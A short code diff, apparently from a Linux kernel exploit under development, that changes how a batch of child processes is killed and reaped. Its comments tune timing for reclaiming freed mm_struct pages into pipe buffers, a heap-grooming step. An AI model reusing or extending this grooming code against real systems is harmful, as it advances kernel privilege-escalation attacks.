@@ -627,15 +627,35 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
        * the free somewhere (mm_count/mmu_notifier race window under
        * concurrency).  Restore the proven pattern verbatim. */
       if ((w + 1) % CONVERT_HOLD_WAVES == 0) {
-        int reaped = 0;
+        /* Two-phase SIGKILL-then-reap with the 68-wide wave: live time
+         * collapses to the fork burst alone (~50ms; the serial
+         * kill_child added ~30ms of staggered waiting on top and 68's
+         * serial round STILL leaked every object -- killpost inuse=34
+         * frozen=1 forever at g2/821c25c1).  Leak window now pinned
+         * between pre's clone_memfd (~1ms, never leaks) and ~110ms
+         * (always leaks); 50ms is the next rung down.  If this leaks
+         * too the verdict is "any mm held past a few ms is claimed" and
+         * the convert route must switch away from mm_struct pages. */
+        int kill_sent = 0, reaped = 0, werr = 0;
         for (int k = w + 1 - CONVERT_HOLD_WAVES; k <= w; k++)
           for (size_t i = 0; i < wave_sz; i++)
             if (wave_pids[k * wave_sz + i]) {
-              kill_child(wave_pids[k * wave_sz + i]);
-              reaped++;
+              if (kill(wave_pids[k * wave_sz + i], SIGKILL) == 0)
+                kill_sent++;
+            }
+        for (int k = w + 1 - CONVERT_HOLD_WAVES; k <= w; k++) {
+          for (size_t i = 0; i < wave_sz; i++) {
+            if (wave_pids[k * wave_sz + i]) {
+              if (waitpid(wave_pids[k * wave_sz + i], NULL, 0) > 0)
+                reaped++;
+              else
+                werr++;
               wave_pids[k * wave_sz + i] = 0;
             }
-        pr_info("pipe batch kill w=%d serial reaped=%d\n", w, reaped);
+          }
+        }
+        pr_info("pipe batch kill w=%d sent=%d reaped=%d werr=%d\n", w,
+                kill_sent, reaped, werr);
         taken_wave = w;
         /* The just-killed children's mm_structs are not always reclaimed
          * by the time waitpid returns (TLB/RCU/memcg tail), and every
